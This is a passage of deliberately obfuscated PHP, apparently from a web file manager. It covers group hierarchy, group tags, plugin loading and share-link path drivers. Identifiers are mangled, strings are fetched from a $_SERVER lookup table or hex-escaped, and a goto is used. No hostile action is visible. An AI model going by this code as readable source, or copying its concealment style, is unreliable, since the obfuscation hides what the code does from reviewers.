($…¼ÆÎÁÒ = 0; $…¼ÆÎÁÒ < count($É‡˜ëº¹); $…¼ÆÎÁÒ++) { if ($Ö›¸Š‹® == $…¼ÆÎÁÒ) { continue; } if ($this->isParentOf($É‡˜ëº¹[$…¼ÆÎÁÒ], $É‡˜ëº¹[$Ö›¸Š‹®])) { $ü”êŒç— = !0; break; } } if (!$ü”êŒç—) { $ÂÖÜ­â[] = $É‡˜ëº¹[$Ö›¸Š‹®]; } } return $ÂÖÜ­â; } protected function isParentOf($Èˆ˜©Ã±, $‰†ÆÉ´ı) { $œç·İÅ =& $_SERVER[¤øïŠ‹²]; if (!$Èˆ˜©Ã± || !$‰†ÆÉ´ı || $Èˆ˜©Ã± == $‰†ÆÉ´ı) { return !1; } $ØÈşĞíŠ = $this->getInfoSimple($Èˆ˜©Ã±); $ôÇê˜«¶ = $this->getInfoSimple($‰†ÆÉ´ı); $š´ Á”ë = $ØÈşĞíŠ[$œç·İÅ[610]] . $Èˆ˜©Ã± . $œç·İÅ[50]; if (substr($ôÇê˜«¶[$œç·İÅ[610]], 0, strlen($š´ Á”ë)) == $š´ Á”ë) { return !0; } return !1; } public function groupShowRoot($¼¥Ö†î®, $±ôÃ¾© = false) { $‰‰øş»® =& $_SERVER[¤øïŠ‹²]; $¡Æä¢É• = $this->getInfo($¼¥Ö†î®); if (!$¡Æä¢É•) { return array(); } $¿ëœÀ‘ = $this->parentLevelArray($¡Æä¢É•[$‰‰øş»®[610]]); $ö¥í€Ÿ = array($¼¥Ö†î®); if (count($¿ëœÀ‘) == 0) { return $ö¥í€Ÿ; } if ($±ôÃ¾© && count($¿ëœÀ‘) == 1) { return $ö¥í€Ÿ; } if (!$¡Æä¢É•[$‰‰øş»®[561]] || !isset($¡Æä¢É•[$‰‰øş»®[561]][$‰‰øş»®[2217]]) || $¡Æä¢É•[$‰‰øş»®[561]][$‰‰øş»®[2217]] == $‰‰øş»®[880]) { return $this->groupShowRoot($¿ëœÀ‘[count($¿ëœÀ‘) - 1], $±ôÃ¾©); } if ($¡Æä¢É•[$‰‰øş»®[561]][$‰‰øş»®[2217]] == $‰‰øş»®[444]) { $—åë±© = explode($‰‰øş»®[50], $¡Æä¢É•[$‰‰øş»®[561]][$‰‰øş»®[2218]]); if ($—åë±©) { $ö¥í€Ÿ = array_merge($ö¥í€Ÿ, $—åë±©); } } return $ö¥í€Ÿ; } protected function resetParentLevel() { $Ú†Ö£Ùé =& $_SERVER[¤øïŠ‹²]; $Æú€Öæ· = $Ú†Ö£Ùé[1444]; $üşèĞÑĞ = $this->select(); $üşèĞÑĞ = array_to_keyvalue($üşèĞÑĞ, $Æú€Öæ·); foreach ($üşèĞÑĞ as $›Âü×§¢) { $­ÉÌ´¶± = $›Âü×§¢; $ìœØº¢Ã = array(); while ($­ÉÌ´¶±[$Ú†Ö£Ùé[203]] != 0) { $ìœØº¢Ã[] = $­ÉÌ´¶±[$Ú†Ö£Ùé[203]]; $­ÉÌ´¶± = $üşèĞÑĞ[$­ÉÌ´¶±[$Ú†Ö£Ùé[203]]]; } $ìœØº¢Ã[] = 0; $ìœØº¢Ã = $Ú†Ö£Ùé[50] . implode($Ú†Ö£Ùé[50], array_reverse($ìœØº¢Ã)) . $Ú†Ö£Ùé[50]; $this->setNamePinyin($›Âü×§¢[$Æú€Öæ·], $›Âü×§¢[$Ú†Ö£Ùé[32]]); $this->where(array($Æú€Öæ· => $›Âü×§¢[$Æú€Öæ·]))->save(array($Ú†Ö£Ùé[681] => $ìœØº¢Ã)); } return $üşèĞÑĞ; } public function groupNameAuto($ãªÓ˜‚Ş, $ƒÉëÓê) { $æ¼âÕˆü =& $_SERVER[¤øïŠ‹²]; $™Â‘•ÖÇ = $this->where(array($æ¼âÕˆü[498] => $ãªÓ˜‚Ş))->getField($æ¼âÕˆü[32], !0); if (!$™Â‘•ÖÇ || !in_array($ƒÉëÓê, $™Â‘•ÖÇ)) { return $ƒÉëÓê; } for ($õúÃ®‡á = 1; $õúÃ®‡á <= count($™Â‘•ÖÇ) + 1; $õúÃ®‡á++) { $Õı‚ÂÄ” = $ƒÉëÓê . "\x28{$õúÃ®‡á}\51"; if (!in_array($Õı‚ÂÄ”, $™Â‘•ÖÇ)) { return $Õı‚ÂÄ”; } } } public function groupSwitch($İÃ¥ßã, $Ë¨š¥¾) { $º³«à©Õ =& $_SERVER[¤øïŠ‹²]; $¼Şêâ«ê = array($º³«à©Õ[1444] => array($º³«à©Õ[7], array($İÃ¥ßã, $Ë¨š¥¾))); $·ÔÀÉ¼± = $this->where($¼Şêâ«ê)->select(); $·ÔÀÉ¼± = array_to_keyvalue($·ÔÀÉ¼±, $º³«à©Õ[1444]); $÷ŞÖí€‘ = _get($·ÔÀÉ¼±, $İÃ¥ßã); $¸”åù—‚ = _get($·ÔÀÉ¼±, $Ë¨š¥¾); if (!$÷ŞÖí€‘ || !$¸”åù—‚ || $÷ŞÖí€‘[$º³«à©Õ[203]] == 0) { return !1; } if ($÷ŞÖí€‘[$º³«à©Õ[1444]] == $¸”åù—‚[$º³«à©Õ[1444]]) { return !1; } if (strpos($¸”åù—‚[$º³«à©Õ[610]], $÷ŞÖí€‘[$º³«à©Õ[610]] . $÷ŞÖí€‘[$º³«à©Õ[1444]] . $º³«à©Õ[50]) === 0) { return !1; } $¼Şêâ«ê = array($º³«à©Õ[1444] => $İÃ¥ßã); $×°Î”²ì = Model($º³«à©Õ[2223])->where($¼Şêâ«ê)->select(); if (!$×°Î”²ì) { $×°Î”²ì = array(); } foreach ($×°Î”²ì as $´Ê™ÒüÈ) { $ÔáºÉÛ¢ = $´Ê™ÒüÈ[$º³«à©Õ[1542]]; $¼Şêâ«ê = array($º³«à©Õ[1542] => $ÔáºÉÛ¢, $º³«à©Õ[1444] => $Ë¨š¥¾); $ñÜ›¼áˆ = Model($º³«à©Õ[2223])->where($¼Şêâ«ê)->find(); if (!$ñÜ›¼áˆ) { $äù˜ÀÆ = array($Ë¨š¥¾ => $´Ê™ÒüÈ[$º³«à©Õ[1589]]); Model($º³«à©Õ[623])->userGroupAdd($ÔáºÉÛ¢, $äù˜ÀÆ); } Model($º³«à©Õ[623])->userGroupRemove($ÔáºÉÛ¢, $İÃ¥ßã); } $¼Şêâ«ê = array($º³«à©Õ[201] => 2, $º³«à©Õ[203] => 0, $º³«à©Õ[506] => 1, $º³«à©Õ[595] => array($º³«à©Õ[7], array($İÃ¥ßã, $Ë¨š¥¾))); $§›’¤ñÁ = Model($º³«à©Õ[934])->where($¼Şêâ«ê)->field($º³«à©Õ[2237])->select(); $§›’¤ñÁ = array_to_keyvalue($§›’¤ñÁ, $º³«à©Õ[595], $º³«à©Õ[204]); $µÙ§°ïÖ = !empty($§›’¤ñÁ[$İÃ¥ßã]) ? $§›’¤ñÁ[$İÃ¥ßã] : !1; if ($µÙ§°ïÖ) { if (!$§›’¤ñÁ[$Ë¨š¥¾]) { $§›’¤ñÁ[$Ë¨š¥¾] = Model($º³«à©Õ[934])->groupRootAdd($Ë¨š¥¾); } $‡ÖÎ¦™ˆ = $§›’¤ñÁ[$Ë¨š¥¾]; $¼Şêâ«ê = array($º³«à©Õ[203] => $µÙ§°ïÖ); $§›’¤ñÁ = Model($º³«à©Õ[934])->where($¼Şêâ«ê)->field($º³«à©Õ[2238])->select(); if (!$§›’¤ñÁ) { $§›’¤ñÁ = array(); } Model($º³«à©Õ[934])->moveClearAuth = !1; foreach ($§›’¤ñÁ as $”“¹õÑ²) { $Á´û®Í” = $”“¹õÑ²[$º³«à©Õ[506]] == $º³«à©Õ[102] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($º³«à©Õ[934])->move($”“¹õÑ²[$º³«à©Õ[204]], $‡ÖÎ¦™ˆ, $Á´û®Í”); } Model($º³«à©Õ[934])->moveClearAuth = !0; $¼Şêâ«ê = array($º³«à©Õ[201] => 2, $º³«à©Õ[595] => $İÃ¥ßã); $¬–¶Ùû» = array($º³«à©Õ[595] => $Ë¨š¥¾); Model($º³«à©Õ[2239])->where($¼Şêâ«ê)->save($¬–¶Ùû»); Model($º³«à©Õ[2240])->where($¼Şêâ«ê)->save($¬–¶Ùû»); } $this->_changeChildLevel($·ÔÀÉ¼±[$İÃ¥ßã], $·ÔÀÉ¼±[$Ë¨š¥¾], !0); $this->where(array($º³«à©Õ[203] => $İÃ¥ßã))->save(array($º³«à©Õ[203] => $Ë¨š¥¾)); $this->_clearChildrenCache($·ÔÀÉ¼±[$Ë¨š¥¾]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($Úï¶Şç÷) { $¡äâ¨¹ =& $_SERVER[¤øïŠ‹²]; return array($¡äâ¨¹[2241] => array($Úï¶Şç÷[0], $¡äâ¨¹[2242]), $¡äâ¨¹[2243] => array($Úï¶Şç÷[0], $¡äâ¨¹[2244])); } protected function ___get($â±€ƒâ×) { $ÃÈ“Ç¨ş =& $_SERVER[¤øïŠ‹²]; $ã·“ìŞ = Model($ÃÈ“Ç¨ş[611])->metaGet($â±€ƒâ×, $ÃÈ“Ç¨ş[2245]); $¤™ªœ¹ = json_decode($ã·“ìŞ, !0); return $¤™ªœ¹ ? $¤™ªœ¹ : array($ÃÈ“Ç¨ş[2246] => $ÃÈ“Ç¨ş[102], $ÃÈ“Ç¨ş[457] => array()); } protected function ___listData($¹¦ˆ…¨ò) { $áÖÕ½¥Ü =& $_SERVER[¤øïŠ‹²]; $èÎôËÒÌ = array($áÖÕ½¥Ü[1916] => 0, $áÖÕ½¥Ü[579] => array($áÖÕ½¥Ü[2247], 0), $áÖÕ½¥Ü[517] => $áÖÕ½¥Ü[1440] . $¹¦ˆ…¨ò); $ãúòóÒä = $áÖÕ½¥Ü[2248]; $¨“´»ì“ = $this->field($ãúòóÒä)->where($èÎôËÒÌ)->order($áÖÕ½¥Ü[2249])->select(); return $¨“´»ì“ ? $¨“´»ì“ : array(); } protected function set($ğ¨öúšŒ, $¹ü¥¬¾») { $æ„°óÛµ =& $_SERVER[¤øïŠ‹²]; $¹ü¥¬¾» = $¹ü¥¬¾» ? $¹ü¥¬¾» : array($æ„°óÛµ[2246] => $æ„°óÛµ[102], $æ„°óÛµ[457] => array()); return Model($æ„°óÛµ[611])->metaSet($ğ¨öúšŒ, $æ„°óÛµ[2245], json_encode($¹ü¥¬¾»)); } protected function getByTagID($¬Õ šş¼, $ĞŞ°òèƒ) { $Â•õ÷¦¶ =& $_SERVER[¤øïŠ‹²]; if (!$¬Õ šş¼ || !$ĞŞ°òèƒ) { return !1; } if (!Model($Â•õ÷¦¶[611])->getInfoSimple($¬Õ šş¼)) { return !1; } $¼âä½ˆœ = $this->get($¬Õ šş¼); if (!$¼âä½ˆœ || !isset($¼âä½ˆœ[$Â•õ÷¦¶[457]])) { return !1; } $¿İ¨¢à = array_find_by_field($¼âä½ˆœ[$Â•õ÷¦¶[457]], $Â•õ÷¦¶[493], $ĞŞ°òèƒ); return is_array($¿İ¨¢à) ? $¿İ¨¢à : !1; } public function listSource($­ûğÇ¢¢, $°Ìºá³) { $¢å˜Şí· =& $_SERVER[¤øïŠ‹²]; if ($°Ìºá³ && !is_array($°Ìºá³)) { $°Ìºá³ = array($°Ìºá³); } $ÁöÍœÅù = $this->get($­ûğÇ¢¢); $…øÛ”ù½ = array_to_keyvalue($ÁöÍœÅù[$¢å˜Şí·[457]], $¢å˜Şí·[493]); $»º«ƒô = array_to_keyvalue($ÁöÍœÅù[$¢å˜Şí·[604]], $¢å˜Şí·[493]); $”ÑŒò”Œ = $this->listData($­ûğÇ¢¢); $—™‡é¶¶ = array(); foreach ($°Ìºá³ as $¬§šå³) { $‚ µÄŸÌ = $…øÛ”ù½[$¬§šå³]; $øåˆåĞ„ = _get($‚ µÄŸÌ, $¢å˜Şí·[604]); if (!$‚ µÄŸÌ || !$øåˆåĞ„ || !$»º«ƒô[$øåˆåĞ„]) { continue; } if (!$—™‡é¶¶[$øåˆåĞ„]) { $—™‡é¶¶[$øåˆåĞ„] = array(); } $—™‡é¶¶[$øåˆåĞ„][] = $¬§šå³; } $º¶êÖÅí = array(); $¤ñ²°Àƒ = array(); foreach ($”ÑŒò”Œ as $àöáƒ‹ñ) { $õˆ¹Õã± = $àöáƒ‹ñ[$¢å˜Şí·[98]]; $‚ µÄŸÌ = $…øÛ”ù½[$àöáƒ‹ñ[$¢å˜Şí·[521]]]; $øåˆåĞ„ = _get($‚ µÄŸÌ, $¢å˜Şí·[604]); if (!$‚ µÄŸÌ || !$øåˆåĞ„ || !$—™‡é¶¶[$øåˆåĞ„] || !$õˆ¹Õã±) { continue; } if (!in_array($àöáƒ‹ñ[$¢å˜Şí·[521]], $—™‡é¶¶[$øåˆåĞ„])) { continue; } if (!$º¶êÖÅí[$õˆ¹Õã±]) { $º¶êÖÅí[$õˆ¹Õã±] = array(); } $º¶êÖÅí[$õˆ¹Õã±][] = $øåˆåĞ„; } foreach ($º¶êÖÅí as $õˆ¹Õã± => $‘èĞ¼ÍŞ) { if (count($‘èĞ¼ÍŞ) != count($—™‡é¶¶)) { continue; } $¤ñ²°Àƒ[] = $õˆ¹Õã±; } if (!$¤ñ²°Àƒ) { return array(); } $ÁÇÒ›—­ = array($¢å˜Şí·[512] => array($¢å˜Şí·[513], $¤ñ²°Àƒ), $¢å˜Şí·[595] => $­ûğÇ¢¢, $¢å˜Şí·[201] => SourceModel::TYPE_GROUP); $¹âÔûÏ± = Model($¢å˜Şí·[1482])->listSource($ÁÇÒ›—­); if (!$¹âÔûÏ± || count($¤ñ²°Àƒ) == $¹âÔûÏ±[$¢å˜Şí·[454]][$¢å˜Şí·[455]]) { return $¹âÔûÏ±; } $¿»‘ï¾¹ = array(); $ÆÇ†ùù¾ = array_to_keyvalue($¹âÔûÏ±[$¢å˜Şí·[96]], $¢å˜Şí·[12], $¢å˜Şí·[204]); $¬Ù ºĞ» = array_to_keyvalue($¹âÔûÏ±[$¢å˜Şí·[97]], $¢å˜Şí·[12], $¢å˜Şí·[204]); $Ùê¿ûÍ = array_merge($¬Ù ºĞ», $ÆÇ†ùù¾); foreach ($¤ñ²°Àƒ as $õˆ¹Õã±) { if (!in_array($õˆ¹Õã±, $Ùê¿ûÍ)) { $¿»‘ï¾¹[] = $õˆ¹Õã±; } } if ($¿»‘ï¾¹) { $this->removeBySource($­ûğÇ¢¢, $¿»‘ï¾¹); } return $¹âÔûÏ±; } protected function addToTag($²÷½«’Ô, $ˆ£³ÖÇÓ, $¶ŞÄì†) { $Öáİòó =& $_SERVER[¤øïŠ‹²]; if (!$this->getByTagID($²÷½«’Ô, $¶ŞÄì†) || !$ˆ£³ÖÇÓ) { return !1; } if (!Model($Öáİòó[934])->pathInfo($ˆ£³ÖÇÓ)) { return !1; } $©Ø¯ ¬µ = array($Öáİòó[1916] => 0, $Öáİòó[579] => $¶ŞÄì†, $Öáİòó[516] => $ˆ£³ÖÇÓ, $Öáİòó[517] => $Öáİòó[2250] . $²÷½«’Ô, $Öáİòó[515] => $Öáİòó[12], $Öáİòó[2135] => 0); if ($this->where($©Ø¯ ¬µ)->find()) { return !1; } return $this->add($©Ø¯ ¬µ); } protected function removeFromTag($»ÊŠ÷Íí, $·šÖÜÕ–, $ŞŸ«şÆ) { $¿ºËÄƒÎ =& $_SERVER[¤øïŠ‹²]; if (!$this->getByTagID($»ÊŠ÷Íí, $ŞŸ«şÆ) || !$·šÖÜÕ–) { return !1; } if (is_array($·šÖÜÕ–)) { $·šÖÜÕ– = array($¿ºËÄƒÎ[7], $·šÖÜÕ–); } $ÏšºØÚ = array($¿ºËÄƒÎ[1916] => 0, $¿ºËÄƒÎ[579] => $ŞŸ«şÆ, $¿ºËÄƒÎ[517] => $¿ºËÄƒÎ[2250] . $»ÊŠ÷Íí, $¿ºËÄƒÎ[516] => $·šÖÜÕ–); return $this->where($ÏšºØÚ)->delete(); } protected function removeByTag($¡ù²ÒÛç, $Ùé×ı†ö) { $¡Åçä Ÿ =& $_SERVER[¤øïŠ‹²]; if (!$this->getByTagID($¡ù²ÒÛç, $Ùé×ı†ö)) { return !1; } $‰åàÃ½ = array($¡Åçä Ÿ[1916] => 0, $¡Åçä Ÿ[579] => $Ùé×ı†ö, $¡Åçä Ÿ[517] => $¡Åçä Ÿ[2250] . $¡ù²ÒÛç); return $this->where($‰åàÃ½)->delete(); } protected function removeBySource($¹Çß‰¤Ó, $ß·±Ï‰) { $Œ©ûÚà¦ =& $_SERVER[¤øïŠ‹²]; if (!$¹Çß‰¤Ó || !$ß·±Ï‰) { return !1; } if (is_array($ß·±Ï‰)) { $ß·±Ï‰ = array($Œ©ûÚà¦[7], $ß·±Ï‰); } $èª›»’º = array($Œ©ûÚà¦[1916] => 0, $Œ©ûÚà¦[516] => $ß·±Ï‰, $Œ©ûÚà¦[579] => array($Œ©ûÚà¦[1130], 0), $Œ©ûÚà¦[517] => $Œ©ûÚà¦[2250] . $¹Çß‰¤Ó); return $this->where($èª›»’º)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\160\154\165\147\x69\156\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\163\164\x61\x74\165\163", "\x72\145\x67\151\x65\163\x74", "\x63\x6f\156\146\x69\x67"); public function loadList($Àæ•ÈÄı = false) { $Ï‰¿ë•È = array_to_keyvalue($this->listData(), $_SERVER[¤øïŠ‹²][32]); if ($Àæ•ÈÄı) { return $Ï‰¿ë•È[$Àæ•ÈÄı]; } return $Ï‰¿ë•È; } public function init() { $™–ÕûÙì =& $_SERVER[¤øïŠ‹²]; Hook::trigger($™–ÕûÙì[2251]); $âı¶ªÂ = $this->loadPluginList(); foreach ($âı¶ªÂ as $¤£òİ™ê => $À®Ğï§) { $•ëğ©ñº = $this->appAllow($¤£òİ™ê, $À®Ğï§); if (!$•ëğ©ñº) { continue; } foreach ($À®Ğï§[$™–ÕûÙì[2252]] as $íÊŞ‹™† => $Œş¹µÙ°) { Hook::bind($íÊŞ‹™†, $Œş¹µÙ°); } } Hook::trigger($™–ÕûÙì[2253]); Hook::trigger(ACTION); } public function appAllow($Ë—£µ¡û, $…êËÂŒÇ, $ÃäÀü¬ = true) { $ºùä =& $_SERVER[¤øïŠ‹²]; $Š¼†¤Ä¾ = PLUGIN_DIR . $Ë—£µ¡û . $ºùä[2254]; if (!is_array($…êËÂŒÇ) || !is_array($…êËÂŒÇ[$ºùä[2252]]) || $…êËÂŒÇ[$ºùä[851]] != 1 || !is_file($Š¼†¤Ä¾)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ºùä[6]][$ºùä[2255]] || !$GLOBALS[$ºùä[6]][$ºùä[2256]]) { return !0; } $““¨¡İŒ = explode($ºùä[50], strtolower($GLOBALS[$ºùä[6]][$ºùä[2256]])); return in_array(strtolower($Ë—£µ¡û), $““¨¡İŒ) ? !1 : !0; } if ($ÃäÀü¬ && !Action($ºùä[2257])->checkAuth($Ë—£µ¡û)) { return !1; } return !0; } public function unInstall($”Ù¼ÙÊ) { $¯ù´Š» =& $_SERVER[¤øïŠ‹²]; $á «„µ = $this->loadList($”Ù¼ÙÊ); if (file_exists(PLUGIN_DIR . $”Ù¼ÙÊ)) { Hook::apply($”Ù¼ÙÊ . $¯ù´Š»[2258]); } $this->remove($á «„µ[$¯ù´Š»[493]]); } public function changeStatus($üöÙ’ÁÔ, $¬´›ƒÙÖ) { $ÈÖ‡ş÷¥ =& $_SERVER[¤øïŠ‹²]; $¹¸µûãÚ = $this->loadList($üöÙ’ÁÔ); if ($¬´›ƒÙÖ) { Hook::apply($üöÙ’ÁÔ . $ÈÖ‡ş÷¥[2259]); } $this->update($¹¸µûãÚ[$ÈÖ‡ş÷¥[493]], array($ÈÖ‡ş÷¥[2260] => $¬´›ƒÙÖ)); } public function appRegist($ĞÀ‚ò, $ƒ›Ù¾ãÈ) { $ï¶•àŞ‰ =& $_SERVER[¤øïŠ‹²]; $ñı¡Õ‚– = $this->loadList($ĞÀ‚ò); if ($ñı¡Õ‚–) { $this->update($ñı¡Õ‚–[$ï¶•àŞ‰[493]], array($ï¶•àŞ‰[2252] => $ƒ›Ù¾ãÈ)); } else { $æÜÙ–˜‰ = array($ï¶•àŞ‰[32] => $ĞÀ‚ò, $ï¶•àŞ‰[2252] => $ƒ›Ù¾ãÈ, $ï¶•àŞ‰[851] => 0, $ï¶•àŞ‰[6] => $this->getConfigDefault($ĞÀ‚ò)); $this->insert($æÜÙ–˜‰); } } public function getConfigDefault($àšï¾í¯) { $·ùñÛ”– =& $_SERVER[¤øïŠ‹²]; $ö£²Ûßã = array(); $ºÈ‡šßæ = $this->getPackageJson($àšï¾í¯); if (!$ºÈ‡šßæ && is_array($ºÈ‡šßæ[$·ùñÛ”–[2261]])) { return $ö£²Ûßã; } foreach ($ºÈ‡šßæ[$·ùñÛ”–[2261]] as $ñıÍ¶¯Ğ => $ª¯ôŠ€ª) { if (!isset($ª¯ôŠ€ª[$·ùñÛ”–[462]]) || isset($ö£²Ûßã[$ñıÍ¶¯Ğ])) { continue; } $ö£²Ûßã[$ñıÍ¶¯Ğ] = $ª¯ôŠ€ª[$·ùñÛ”–[462]]; } return $ö£²Ûßã; } public function getPackageJson($‘õì¥â—) { return Hook::apply($‘õì¥â— . $_SERVER[¤øïŠ‹²][2262]); } public function getConfig($‹Øåæ›, $Òå¢Èğí = false) { $‹¬æıåÄ =& $_SERVER[¤øïŠ‹²]; $ã÷ÖÕ‚» = array(); $Ã€îıÕ = $this->loadList($‹Øåæ›); if ($Ã€îıÕ && is_array($Ã€îıÕ[$‹¬æıåÄ[6]])) { $ã÷ÖÕ‚» = $Ã€îıÕ[$‹¬æıåÄ[6]]; } if (!$ã÷ÖÕ‚» || $Òå¢Èğí) { $ã÷ÖÕ‚» = $this->getConfigDefault($‹Øåæ›); } return $ã÷ÖÕ‚»; } public function setConfig($İ°àğÂ„, $¾ÜÃ™· = false) { $‰ËÇ£Ä÷ =& $_SERVER[¤øïŠ‹²]; $§Ú‚ÂŸ = $this->loadList($İ°àğÂ„); if (!$§Ú‚ÂŸ) { return !1; } $éÌÃôÑ = $§Ú‚ÂŸ[$‰ËÇ£Ä÷[6]]; if ($¾ÜÃ™· == !1) { $éÌÃôÑ = array(); $¾ÜÃ™· = $this->getConfigDefault($İ°àğÂ„); } foreach ($¾ÜÃ™· as $Ñşî¬¾¶ => $Ø¤Ğú¼€) { $éÌÃôÑ[$Ñşî¬¾¶] = is_string($Ø¤Ğú¼€) ? trim($Ø¤Ğú¼€) : $Ø¤Ğú¼€; } $this->update($§Ú‚ÂŸ[$‰ËÇ£Ä÷[493]], array($‰ËÇ£Ä÷[6] => $éÌÃôÑ)); } public function viewList() { $¦¸—ŞÓÉ =& $_SERVER[¤øïŠ‹²]; $Ü³ãÀÄ = $this->loadList(); $this->pluginScan($Ü³ãÀÄ); $Ü³ãÀÄ = $this->loadPluginList(); $‘³‘ß€å = array(); foreach ($Ü³ãÀÄ as $¨¼—ÆÖ => $œ˜ûÃ) { $§ÆµóÎ‘ = $œ˜ûÃ; unset($œ˜ûÃ[$¦¸—ŞÓÉ[2252]], $œ˜ûÃ[$¦¸—ŞÓÉ[6]]); $òàòøÔ = PLUGIN_DIR . $œ˜ûÃ[$¦¸—ŞÓÉ[32]] . $¦¸—ŞÓÉ[2254]; if (!is_file($òàòøÔ)) { continue; } $‡¾ôö×Ç = Hook::apply($œ˜ûÃ[$¦¸—ŞÓÉ[32]] . $¦¸—ŞÓÉ[2262]); if (!is_array($‡¾ôö×Ç)) { continue; } $‘³‘ß€å[$¨¼—ÆÖ] = array_merge($œ˜ûÃ, $‡¾ôö×Ç); if ($§ÆµóÎ‘[$¦¸—ŞÓÉ[6]][$¦¸—ŞÓÉ[1838]] != $‡¾ôö×Ç[$¦¸—ŞÓÉ[1812]]) { Hook::apply($œ˜ûÃ[$¦¸—ŞÓÉ[32]] . $¦¸—ŞÓÉ[2259]); $§ÆµóÎ‘[$¦¸—ŞÓÉ[6]][$¦¸—ŞÓÉ[1838]] = $‡¾ôö×Ç[$¦¸—ŞÓÉ[1812]]; $this->update($œ˜ûÃ[$¦¸—ŞÓÉ[493]], array($¦¸—ŞÓÉ[6] => $§ÆµóÎ‘[$¦¸—ŞÓÉ[6]])); } } return $‘³‘ß€å; } private function loadPluginList() { $ÅÉ¿®é  =& $_SERVER[¤øïŠ‹²]; $±Â×ƒÈê = $this->loadList(); if (strtolower(MOD) == $ÅÉ¿®é [2263]) { return $±Â×ƒÈê; } $õ³´¼÷µ = Hook::trigger($ÅÉ¿®é [2264], $±Â×ƒÈê); if ($±Â×ƒÈê && !$õ³´¼÷µ) { die; } return $õ³´¼÷µ ? $õ³´¼÷µ : $±Â×ƒÈê; } private function pluginScan($©ĞÂÀÕ˜) { $ÆòÜ·ğ´ =& $_SERVER[¤øïŠ‹²]; recursion_dir(PLUGIN_DIR, $á¥°‰È, $²«½½¥™, 0); foreach ($á¥°‰È as $ÎË“•Ì) { $ßó°¢»İ = get_path_this($ÎË“•Ì); if (isset($©ĞÂÀÕ˜[$ßó°¢»İ]) || !file_exists($ÎË“•Ì . $ÆòÜ·ğ´[2265]) || !file_exists($ÎË“•Ì . $ÆòÜ·ğ´[2254])) { continue; } Hook::apply($ßó°¢»İ . $ÆòÜ·ğ´[2259]); } } } goto C‰åô‡—ìÛ; BáŒ†¨†ßø: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÆşèŞû) { $this->pathParse = $ÆşèŞû; $this->model = Model($_SERVER[¤øïŠ‹²][1482]); } protected function infoParse($şÉ”¬ô“, $İ÷×©À = false, $©À£¿Ùç = false) { $„‚¸Ø”ö =& $_SERVER[¤øïŠ‹²]; return Action($„‚¸Ø”ö[1309])->sharePathInfo($this->pathParse[$„‚¸Ø”ö[98]], !0, $İ÷×©À); } public function listPath($˜ïÜİÁ», $£„¨²Î = false) { $æ¿µÓ÷ =& $_SERVER[¤øïŠ‹²]; $Å²„«‡Ó = parent::listPath($˜ïÜİÁ», $£„¨²Î); if (!$Å²„«‡Ó) { return $Å²„«‡Ó; } if (is_array($Å²„«‡Ó[$æ¿µÓ÷[1490]])) { $Å²„«‡Ó[$æ¿µÓ÷[1490]] = Action($æ¿µÓ÷[1309])->shareItemInfo($Å²„«‡Ó[$æ¿µÓ÷[1490]]); } foreach ($Å²„«‡Ó as $¿Ã˜ˆÄ => $ø™Ê¶å) { if (!in_array($¿Ã˜ˆÄ, array($æ¿µÓ÷[97], $æ¿µÓ÷[96]))) { continue; } foreach ($ø™Ê¶å as $¿Ê§È => $‚•çµê) { $Å²„«‡Ó[$¿Ã˜ˆÄ][$¿Ê§È] = Action($æ¿µÓ÷[1309])->shareItemInfo($‚•çµê); } } return $Å²„«‡Ó; } public function listAll($óòÏ¦ Ü) { $Õ¾‹Ó¯– =& $_SERVER[¤øïŠ‹²]; $Ñš–—Üı = IO::info($this->pathParse[$Õ¾‹Ó¯–[98]]); if (!$Ñš–—Üı) { return array(); } $¤‰·çÌŸ = $this->model->listAll($óòÏ¦ Ü); foreach ($¤‰·çÌŸ as &$‘ÌÓ‚åí) { $‘ÌÓ‚åí[$Õ¾‹Ó¯–[101]] = Action($Õ¾‹Ó¯–[1309])->shareItemInfo($‘ÌÓ‚åí[$Õ¾‹Ó¯–[101]]); } unset($‘ÌÓ‚åí); return $¤‰·çÌŸ; } } class PathDriverDriverShareItem { public function __construct($£€ÛÛ½ù) { $this->pathParse = $£€ÛÛ½ù; } public function __call($Ì’ü¬şĞ, $Ü¿ŞÙ) { $Î÷ÓÆÄö =& $_SERVER[¤øïŠ‹²]; if (method_exists($this, $Ì’ü¬şĞ)) { return; } $…ØÏÒû = call_user_func_array(array($Î÷ÓÆÄö[1491], $Ì’ü¬şĞ), $Ü¿ŞÙ); $›ğÊåãô = array($Î÷ÓÆÄö[1492], $Î÷ÓÆÄö[1493], $Î÷ÓÆÄö[1494], $Î÷ÓÆÄö[1495], $Î÷ÓÆÄö[647], $Î÷ÓÆÄö[649], $Î÷ÓÆÄö[1496], $Î÷ÓÆÄö[119], $Î÷ÓÆÄö[1497], $Î÷ÓÆÄö[1498]); if (in_array($Ì’ü¬şĞ, $›ğÊåãô)) { $…ØÏÒû = $this->getPathOuter($…ØÏÒû); } return $…ØÏÒû; } public function copy($íŒßö¨¥, $ï€´ßƒ¶, $³–öƒ˜÷ = false, $üÅ›÷€Ş = false) { return $this->copyMove($íŒßö¨¥, $ï€´ßƒ¶, $³–öƒ˜÷, $_SERVER[¤øïŠ‹²][647], $üÅ›÷€Ş); } public function move($–êì¶šæ, $úºÆ¡Òº, $Éğ¿ÏÀ£ = false, $Ã¨Ê”ò = false) { return $this->copyMove($–êì¶šæ, $úºÆ¡Òº, $Éğ¿ÏÀ£, $_SERVER[¤øïŠ‹²][649], $Ã¨Ê”ò); } private function copyMove($Â¼½°üÉ, $¡ñíÈÉ, $Á …ğÂü, $ª´Àå­ç, $ë±“Ã®Û = false) { $ÓÖĞ·öª =& $_SERVER[¤øïŠ‹²]; $¸òÔˆÜ¤ = $¡ñíÈÉ; $÷½ıŸ„û = IO::driverMake($¡ñíÈÉ); if ($÷½ıŸ„û->pathParse[$ÓÖĞ·öª[1283]]) { $¡ñíÈÉ = $÷½ıŸ„û->pathParse[$ÓÖĞ·öª[1283]]; } else { $¡ñíÈÉ = $¸òÔˆÜ¤; } $­«çÎ¯ = IO::copyMove($Â¼½°üÉ, $¡ñíÈÉ, $Á …ğÂü, $ª´Àå­ç, $ë±“Ã®Û); $­«çÎ¯ = $this->getPathOuter($­«çÎ¯); return $­«çÎ¯; } public function pathThis($œº–ˆ‚Å) { return 